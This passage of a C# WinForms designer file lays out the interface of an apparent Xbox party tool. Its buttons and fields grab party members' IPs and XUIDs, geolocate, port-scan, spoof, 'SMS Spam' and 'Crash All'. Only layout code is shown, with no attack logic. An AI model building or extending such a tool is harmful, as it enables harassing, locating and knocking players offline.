            this.DataClients.Size = new System.Drawing.Size(567, 264);
            this.DataClients.TabIndex = 21;
            // 
            // Gamertag
            // 
            this.Gamertag.FillWeight = 140F;
            this.Gamertag.HeaderText = "Gamertag";
            this.Gamertag.Name = "Gamertag";
            this.Gamertag.ReadOnly = true;
            this.Gamertag.Width = 158;
            // 
            // External
            // 
            this.External.FillWeight = 105F;
            this.External.HeaderText = "External:Port";
            this.External.Name = "External";
            this.External.ReadOnly = true;
            this.External.Width = 159;
            // 
            // NADE
            // 
            this.NADE.HeaderText = "  NAT";
            this.NADE.Name = "NADE";
            this.NADE.ReadOnly = true;
            this.NADE.Width = 65;
            // 
            // jointime
            // 
            this.jointime.HeaderText = "Join Time";
            this.jointime.Name = "jointime";
            this.jointime.ReadOnly = true;
            this.jointime.Width = 185;
            // 
            // xuids
            // 
            this.xuids.HeaderText = "XUID";
            this.xuids.Name = "xuids";
            this.xuids.ReadOnly = true;
            this.xuids.Width = 145;
            // 
            // LabelPartyPrivacy
            // 
            this.LabelPartyPrivacy.BackColor = System.Drawing.Color.Transparent;
            this.LabelPartyPrivacy.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.LabelPartyPrivacy.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.LabelPartyPrivacy.Location = new System.Drawing.Point(356, 287);
            this.LabelPartyPrivacy.Name = "LabelPartyPrivacy";
            this.LabelPartyPrivacy.Size = new System.Drawing.Size(261, 14);
            this.LabelPartyPrivacy.TabIndex = 19;
            this.LabelPartyPrivacy.Text = "Party Privacy: Unknown";
            this.LabelPartyPrivacy.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // button8
            // 
            this.button8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button8.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button8.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button8.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button8.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button8.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button8.Location = new System.Drawing.Point(162, 301);
            this.button8.Name = "button8";
            this.button8.Size = new System.Drawing.Size(104, 32);
            this.button8.TabIndex = 17;
            this.button8.Text = "Grab My Party";
            this.button8.UseVisualStyleBackColor = false;
            this.button8.Click += new System.EventHandler(this.button8_Click);
            // 
            // metroTabPage2
            // 
            this.metroTabPage2.Controls.Add(this.button3);
            this.metroTabPage2.Controls.Add(this.button25);
            this.metroTabPage2.Controls.Add(this.panel1);
            this.metroTabPage2.Controls.Add(this.panel4);
            this.metroTabPage2.Controls.Add(this.panel3);
            this.metroTabPage2.Controls.Add(this.panel2);
            this.metroTabPage2.Controls.Add(this.metroPanel68);
            this.metroTabPage2.Controls.Add(this.metroPanel67);
            this.metroTabPage2.Controls.Add(this.metroPanel66);
            this.metroTabPage2.Controls.Add(this.metroPanel65);
            this.metroTabPage2.Controls.Add(this.numericUpDown2);
            this.metroTabPage2.Controls.Add(this.button21);
            this.metroTabPage2.Controls.Add(this.button20);
            this.metroTabPage2.Controls.Add(this.button19);
            this.metroTabPage2.Controls.Add(this.button18);
            this.metroTabPage2.Controls.Add(this.button17);
            this.metroTabPage2.Controls.Add(this.button16);
            this.metroTabPage2.Controls.Add(this.button15);
            this.metroTabPage2.Controls.Add(this.Ping1);
            this.metroTabPage2.Controls.Add(this.SpooferPortTextBox);
            this.metroTabPage2.Controls.Add(this.SpooferIPTextBox);
            this.metroTabPage2.Controls.Add(this.label2);
            this.metroTabPage2.Controls.Add(this.button5);
            this.metroTabPage2.Controls.Add(this.button4);
            this.metroTabPage2.Controls.Add(this.button2);
            this.metroTabPage2.Controls.Add(this.button1);
            this.metroTabPage2.Controls.Add(this.SpoofIPandPortButton);
            this.metroTabPage2.Enabled = true;
            this.metroTabPage2.HorizontalScrollbarBarColor = true;
            this.metroTabPage2.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage2.Name = "metroTabPage2";
            this.metroTabPage2.Size = new System.Drawing.Size(969, 372);
            this.metroTabPage2.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroTabPage2.TabIndex = 1;
            this.metroTabPage2.Text = "      Spoof";
            this.metroTabPage2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTabPage2.VerticalScrollbarBarColor = true;
            this.metroTabPage2.Visible = false;
            // 
            // button3
            // 
            this.button3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button3.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button3.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button3.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button3.Location = new System.Drawing.Point(397, 202);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(89, 29);
            this.button3.TabIndex = 45;
            this.button3.Text = "Port Scan";
            this.button3.UseVisualStyleBackColor = false;
            // 
            // button25
            // 
            this.button25.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button25.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button25.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button25.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button25.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button25.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button25.Location = new System.Drawing.Point(493, 307);
            this.button25.Name = "button25";
            this.button25.Size = new System.Drawing.Size(89, 26);
            this.button25.TabIndex = 44;
            this.button25.Text = "SMS Spam";
            this.button25.UseVisualStyleBackColor = false;
            this.button25.Click += new System.EventHandler(this.button25_Click);
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel1.Location = new System.Drawing.Point(742, 19);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(1, 20);
            this.panel1.TabIndex = 40;
            // 
            // panel4
            // 
            this.panel4.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel4.Location = new System.Drawing.Point(663, 19);
            this.panel4.Name = "panel4";
            this.panel4.Size = new System.Drawing.Size(79, 1);
            this.panel4.TabIndex = 43;
            // 
            // panel3
            // 
            this.panel3.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel3.Location = new System.Drawing.Point(663, 38);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(79, 1);
            this.panel3.TabIndex = 42;
            // 
            // panel2
            // 
            this.panel2.BackColor = System.Drawing.Color.LightSeaGreen;
            this.panel2.Location = new System.Drawing.Point(663, 19);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(1, 20);
            this.panel2.TabIndex = 41;
            // 
            // metroPanel68
            // 
            this.metroPanel68.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel68.CustomBackground = true;
            this.metroPanel68.HorizontalScrollbarBarColor = true;
            this.metroPanel68.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel68.HorizontalScrollbarSize = 10;
            this.metroPanel68.Location = new System.Drawing.Point(663, 38);
            this.metroPanel68.Name = "metroPanel68";
            this.metroPanel68.Size = new System.Drawing.Size(80, 1);
            this.metroPanel68.TabIndex = 39;
            this.metroPanel68.VerticalScrollbarBarColor = true;
            this.metroPanel68.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel68.VerticalScrollbarSize = 10;
            // 
            // metroPanel67
            // 
            this.metroPanel67.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel67.CustomBackground = true;
            this.metroPanel67.HorizontalScrollbarBarColor = true;
            this.metroPanel67.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel67.HorizontalScrollbarSize = 10;
            this.metroPanel67.Location = new System.Drawing.Point(663, 19);
            this.metroPanel67.Name = "metroPanel67";
            this.metroPanel67.Size = new System.Drawing.Size(80, 1);
            this.metroPanel67.TabIndex = 38;
            this.metroPanel67.VerticalScrollbarBarColor = true;
            this.metroPanel67.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel67.VerticalScrollbarSize = 10;
            // 
            // metroPanel66
            // 
            this.metroPanel66.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel66.CustomBackground = true;
            this.metroPanel66.HorizontalScrollbarBarColor = true;
            this.metroPanel66.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel66.HorizontalScrollbarSize = 10;
            this.metroPanel66.Location = new System.Drawing.Point(741, 19);
            this.metroPanel66.Name = "metroPanel66";
            this.metroPanel66.Size = new System.Drawing.Size(1, 20);
            this.metroPanel66.TabIndex = 37;
            this.metroPanel66.VerticalScrollbarBarColor = true;
            this.metroPanel66.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel66.VerticalScrollbarSize = 10;
            // 
            // metroPanel65
            // 
            this.metroPanel65.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel65.CustomBackground = true;
            this.metroPanel65.HorizontalScrollbarBarColor = true;
            this.metroPanel65.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel65.HorizontalScrollbarSize = 10;
            this.metroPanel65.Location = new System.Drawing.Point(663, 19);
            this.metroPanel65.Name = "metroPanel65";
            this.metroPanel65.Size = new System.Drawing.Size(1, 20);
            this.metroPanel65.TabIndex = 36;
            this.metroPanel65.VerticalScrollbarBarColor = true;
            this.metroPanel65.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel65.VerticalScrollbarSize = 10;
            // 
            // numericUpDown2
            // 
            this.numericUpDown2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.numericUpDown2.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.numericUpDown2.Location = new System.Drawing.Point(663, 19);
            this.numericUpDown2.Maximum = new decimal(new int[] {
            10000000,
            0,
            0,
            0});
            this.numericUpDown2.Minimum = new decimal(new int[] {
            150,
            0,
            0,
            0});
            this.numericUpDown2.Name = "numericUpDown2";
            this.numericUpDown2.Size = new System.Drawing.Size(80, 20);
            this.numericUpDown2.TabIndex = 35;
            this.numericUpDown2.Value = new decimal(new int[] {
            500,
            0,
            0,
            0});
            // 
            // button21
            // 
            this.button21.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button21.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button21.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button21.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button21.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button21.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button21.Location = new System.Drawing.Point(568, 18);
            this.button21.Name = "button21";
            this.button21.Size = new System.Drawing.Size(89, 23);
            this.button21.TabIndex = 34;
            this.button21.Text = "Loop";
            this.button21.UseVisualStyleBackColor = false;
            this.button21.Click += new System.EventHandler(this.button21_Click);
            // 
            // button20
            // 
            this.button20.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button20.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button20.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button20.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button20.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button20.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button20.Location = new System.Drawing.Point(397, 307);
            this.button20.Name = "button20";
            this.button20.Size = new System.Drawing.Size(89, 26);
            this.button20.TabIndex = 33;
            this.button20.Text = "Need Help?";
            this.button20.UseVisualStyleBackColor = false;
            this.button20.Click += new System.EventHandler(this.button20_Click);
            // 
            // button19
            // 
            this.button19.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button19.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button19.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button19.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button19.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button19.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button19.Location = new System.Drawing.Point(493, 272);
            this.button19.Name = "button19";
            this.button19.Size = new System.Drawing.Size(89, 29);
            this.button19.TabIndex = 32;
            this.button19.Text = "Site IP History";
            this.button19.UseVisualStyleBackColor = false;
            this.button19.Click += new System.EventHandler(this.button19_Click);
            // 
            // button18
            // 
            this.button18.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button18.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button18.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button18.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button18.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button18.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button18.Location = new System.Drawing.Point(493, 237);
            this.button18.Name = "button18";
            this.button18.Size = new System.Drawing.Size(89, 29);
            this.button18.TabIndex = 31;
            this.button18.Text = "Site Checker";
            this.button18.UseVisualStyleBackColor = false;
            this.button18.Click += new System.EventHandler(this.button18_Click);
            // 
            // button17
            // 
            this.button17.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button17.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button17.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button17.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button17.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button17.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button17.Location = new System.Drawing.Point(493, 202);
            this.button17.Name = "button17";
            this.button17.Size = new System.Drawing.Size(89, 29);
            this.button17.TabIndex = 30;
            this.button17.Text = "Site To IP";
            this.button17.UseVisualStyleBackColor = false;
            this.button17.Click += new System.EventHandler(this.button17_Click);
            // 
            // button16
            // 
            this.button16.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button16.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button16.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button16.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button16.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button16.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button16.Location = new System.Drawing.Point(492, 167);
            this.button16.Name = "button16";
            this.button16.Size = new System.Drawing.Size(89, 29);
            this.button16.TabIndex = 29;
            this.button16.Text = "Firewall";
            this.button16.UseVisualStyleBackColor = false;
            this.button16.Click += new System.EventHandler(this.button16_Click);
            // 
            // button15
            // 
            this.button15.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button15.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button15.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button15.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button15.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button15.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button15.Location = new System.Drawing.Point(492, 132);
            this.button15.Name = "button15";
            this.button15.Size = new System.Drawing.Size(89, 29);
            this.button15.TabIndex = 28;
            this.button15.Text = "Carrier";
            this.button15.UseVisualStyleBackColor = false;
            this.button15.Click += new System.EventHandler(this.button15_Click);
            // 
            // Ping1
            // 
            this.Ping1.BackColor = System.Drawing.Color.Black;
            this.Ping1.CustomBackground = true;
            this.Ping1.CustomForeColor = true;
            this.Ping1.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.Ping1.Location = new System.Drawing.Point(374, 103);
            this.Ping1.Name = "Ping1";
            this.Ping1.Size = new System.Drawing.Size(228, 23);
            this.Ping1.Style = MetroFramework.MetroColorStyle.Black;
            this.Ping1.TabIndex = 27;
            this.Ping1.Text = "Enter an IP, Phone number, or Website.";
            this.Ping1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.Ping1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.Ping1.UseStyleColors = true;
            this.Ping1.Enter += new System.EventHandler(this.Ping1_Enter_1);
            this.Ping1.Leave += new System.EventHandler(this.Ping1_Leave_1);
            // 
            // SpooferPortTextBox
            // 
            this.SpooferPortTextBox.BackColor = System.Drawing.Color.Black;
            this.SpooferPortTextBox.CustomBackground = true;
            this.SpooferPortTextBox.CustomForeColor = true;
            this.SpooferPortTextBox.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SpooferPortTextBox.Location = new System.Drawing.Point(476, 18);
            this.SpooferPortTextBox.Name = "SpooferPortTextBox";
            this.SpooferPortTextBox.Size = new System.Drawing.Size(86, 23);
            this.SpooferPortTextBox.Style = MetroFramework.MetroColorStyle.Black;
            this.SpooferPortTextBox.TabIndex = 26;
            this.SpooferPortTextBox.Text = "1337";
            this.SpooferPortTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.SpooferPortTextBox.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.SpooferPortTextBox.UseStyleColors = true;
            this.SpooferPortTextBox.Enter += new System.EventHandler(this.SpooferPortTextBox_Enter_1);
            this.SpooferPortTextBox.Leave += new System.EventHandler(this.SpooferPortTextBox_Leave_1);
            // 
            // SpooferIPTextBox
            // 
            this.SpooferIPTextBox.BackColor = System.Drawing.Color.Black;
            this.SpooferIPTextBox.CustomBackground = true;
            this.SpooferIPTextBox.CustomForeColor = true;
            this.SpooferIPTextBox.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SpooferIPTextBox.Location = new System.Drawing.Point(242, 18);
            this.SpooferIPTextBox.Name = "SpooferIPTextBox";
            this.SpooferIPTextBox.Size = new System.Drawing.Size(228, 23);
            this.SpooferIPTextBox.Style = MetroFramework.MetroColorStyle.Black;
            this.SpooferIPTextBox.TabIndex = 25;
            this.SpooferIPTextBox.Text = "1.3.3.7";
            this.SpooferIPTextBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.SpooferIPTextBox.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.SpooferIPTextBox.UseStyleColors = true;
            this.SpooferIPTextBox.Enter += new System.EventHandler(this.SpooferIPTextBox_Enter_1);
            this.SpooferIPTextBox.Leave += new System.EventHandler(this.SpooferIPTextBox_Leave_1);
            // 
            // label2
            // 
            this.label2.BackColor = System.Drawing.Color.LightSeaGreen;
            this.label2.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.Location = new System.Drawing.Point(204, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(567, 13);
            this.label2.TabIndex = 19;
            this.label2.Text = "  Spoof and Resolve";
            this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // button5
            // 
            this.button5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button5.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button5.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button5.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button5.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button5.Location = new System.Drawing.Point(397, 272);
            this.button5.Name = "button5";
            this.button5.Size = new System.Drawing.Size(89, 29);
            this.button5.TabIndex = 18;
            this.button5.Text = "Proxy Detect";
            this.button5.UseVisualStyleBackColor = false;
            this.button5.Click += new System.EventHandler(this.button5_Click);
            // 
            // button4
            // 
            this.button4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button4.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button4.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button4.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button4.Location = new System.Drawing.Point(397, 237);
            this.button4.Name = "button4";
            this.button4.Size = new System.Drawing.Size(89, 29);
            this.button4.TabIndex = 17;
            this.button4.Text = "Nmap";
            this.button4.UseVisualStyleBackColor = false;
            this.button4.Click += new System.EventHandler(this.button4_Click);
            // 
            // button2
            // 
            this.button2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button2.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button2.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button2.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button2.Location = new System.Drawing.Point(397, 167);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(89, 29);
            this.button2.TabIndex = 15;
            this.button2.Text = "Geo Locate";
            this.button2.UseVisualStyleBackColor = false;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button1.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button1.Location = new System.Drawing.Point(397, 132);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(89, 29);
            this.button1.TabIndex = 14;
            this.button1.Text = "Ping";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // metroTabPage4
            // 
            this.metroTabPage4.Controls.Add(this.LoadFollowersBtn);
            this.metroTabPage4.Controls.Add(this.label3);
            this.metroTabPage4.Controls.Add(this.LoadFriendsBtn);
            this.metroTabPage4.Controls.Add(this.CrashAllx);
            this.metroTabPage4.Controls.Add(this.KickAllx);
            this.metroTabPage4.Controls.Add(this.metroPanel42);
            this.metroTabPage4.Controls.Add(this.metroPanel41);
            this.metroTabPage4.Controls.Add(this.metroPanel40);
            this.metroTabPage4.Controls.Add(this.metroPanel39);
            this.metroTabPage4.Controls.Add(this.metroPanel38);
            this.metroTabPage4.Controls.Add(this.metroPanel37);
            this.metroTabPage4.Controls.Add(this.metroPanel36);
            this.metroTabPage4.Controls.Add(this.metroPanel35);
            this.metroTabPage4.Controls.Add(this.metroPanel34);
            this.metroTabPage4.Controls.Add(this.metroPanel33);
            this.metroTabPage4.Controls.Add(this.metroPanel32);
            this.metroTabPage4.Controls.Add(this.metroPanel31);
            this.metroTabPage4.Controls.Add(this.metroPanel30);
            this.metroTabPage4.Controls.Add(this.metroPanel29);
            this.metroTabPage4.Controls.Add(this.metroPanel28);
            this.metroTabPage4.Controls.Add(this.metroPanel27);
            this.metroTabPage4.Controls.Add(this.metroPanel26);
            this.metroTabPage4.Controls.Add(this.metroPanel25);
            this.metroTabPage4.Controls.Add(this.metroPanel24);
            this.metroTabPage4.Controls.Add(this.metroPanel23);
            this.metroTabPage4.Controls.Add(this.metroPanel22);
            this.metroTabPage4.Controls.Add(this.metroPanel21);
            this.metroTabPage4.Controls.Add(this.metroPanel20);
            this.metroTabPage4.Controls.Add(this.metroPanel19);
            this.metroTabPage4.Controls.Add(this.DataFriends);
            this.metroTabPage4.Enabled = true;
            this.metroTabPage4.HorizontalScrollbarBarColor = true;
            this.metroTabPage4.Location = new System.Drawing.Point(4, 38);
            this.metroTabPage4.Name = "metroTabPage4";
            this.metroTabPage4.Size = new System.Drawing.Size(969, 372);
            this.metroTabPage4.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroTabPage4.TabIndex = 3;
            this.metroTabPage4.Text = "      Friends";
            this.metroTabPage4.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroTabPage4.VerticalScrollbarBarColor = true;
            this.metroTabPage4.Visible = false;
            // 
            // LoadFollowersBtn
            // 
            this.LoadFollowersBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.LoadFollowersBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.LoadFollowersBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.LoadFollowersBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.LoadFollowersBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.LoadFollowersBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.LoadFollowersBtn.Location = new System.Drawing.Point(303, 310);
            this.LoadFollowersBtn.Name = "LoadFollowersBtn";
            this.LoadFollowersBtn.Size = new System.Drawing.Size(104, 29);
            this.LoadFollowersBtn.TabIndex = 58;
            this.LoadFollowersBtn.Text = "Load Followers";
            this.LoadFollowersBtn.UseVisualStyleBackColor = false;
            this.LoadFollowersBtn.Click += new System.EventHandler(this.LoadFollowersBtn_Click);
            // 
            // label3
            // 
            this.label3.BackColor = System.Drawing.Color.LightSeaGreen;
            this.label3.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(2, 2);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(954, 13);
            this.label3.TabIndex = 20;
            this.label3.Text = "   Currently In A Party";
            this.label3.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // LoadFriendsBtn
            // 
            this.LoadFriendsBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.LoadFriendsBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.LoadFriendsBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.LoadFriendsBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.LoadFriendsBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.LoadFriendsBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.LoadFriendsBtn.Location = new System.Drawing.Point(413, 310);
            this.LoadFriendsBtn.Name = "LoadFriendsBtn";
            this.LoadFriendsBtn.Size = new System.Drawing.Size(104, 29);
            this.LoadFriendsBtn.TabIndex = 56;
            this.LoadFriendsBtn.Text = "Load Friends";
            this.LoadFriendsBtn.UseVisualStyleBackColor = false;
            this.LoadFriendsBtn.Click += new System.EventHandler(this.LoadFriendsBtn_Click);
            // 
            // CrashAllx
            // 
            this.CrashAllx.AutoSize = true;
            this.CrashAllx.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.CrashAllx.Location = new System.Drawing.Point(595, 313);
            this.CrashAllx.Name = "CrashAllx";
            this.CrashAllx.Size = new System.Drawing.Size(70, 15);
            this.CrashAllx.Style = MetroFramework.MetroColorStyle.Teal;
            this.CrashAllx.TabIndex = 55;
            this.CrashAllx.Text = "Crash All";
            this.CrashAllx.Theme = MetroFramework.MetroThemeStyle.Dark;
